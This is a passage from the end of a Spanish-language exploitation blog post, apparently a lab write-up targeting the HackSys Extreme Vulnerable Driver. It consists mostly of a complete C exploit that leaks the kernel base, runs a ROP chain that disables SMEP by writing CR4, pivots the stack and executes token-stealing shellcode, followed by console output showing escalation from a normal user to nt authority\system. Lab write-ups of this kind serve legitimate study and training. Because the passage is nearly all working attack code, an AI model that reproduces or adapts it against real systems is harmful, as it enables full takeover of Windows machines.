    0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi">
    0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07
</span><span class="p">};

</span><span class="no">typedef struct</span><span class="p"> {
    </span><span class="na">ULONG_PTR</span><span class="p"> objectID;
    </span><span class="na">ULONG_PTR</span><span class="p"> objectType;
} </span><span class="na">UserObject</span><span class="p">;

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> needed;

    EnumDeviceDrivers(drivers,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">needed);  
    </span><span class="na">LPVOID</span><span class="p"> ntoskrnl_base </span><span class="o">=</span><span class="p"> drivers[</span><span class="mi">0</span><span class="p">];

    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(token_stealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, token_stealing,</span><span class="o"> sizeof</span><span class="p">(token_stealing));

    </span><span class="na">LPVOID</span><span class="p"> pivot</span><span class="o"> =</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">) (</span><span class="mi">0x48000000</span><span class="o"> -</span><span class="mi"> 0x1000</span><span class="p">),</span><span class="mi"> 0x10000</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_READWRITE);
    VirtualLock(pivot,</span><span class="mi"> 0x10000</span><span class="p">);

    RtlFillMemory((</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> 0x48000000</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    </span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">) ((</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x48000000</span><span class="o"> +</span><span class="mi"> 0x28</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x2163ec</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">     // cr4 value
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x3a06a7</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) shellcode;</span><span class="c1">                // token stealing
</span><span class="p">
    UserObject payload </span><span class="o">=</span><span class="p"> {
        </span><span class="mi">0x4141414141414141</span><span class="p">,
        (</span><span class="na">ULONG_PTR</span><span class="p">) ntoskrnl_base </span><span class="o">+ </span><span class="mi">0x2f0a30</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;</span><span class="p">
    };

    </span><span class="na">HANDLE</span><span class="p"> handle</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222023</span><span class="p">,</span><span class="o"> &</span><span class="p">payload,</span><span class="o"> sizeof</span><span class="p">(payload),</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit fuera del debugger y pasamos del usuario <code class="language-plaintext highlighter-rouge">user</code> con bajos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> con máximos privilegios en el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>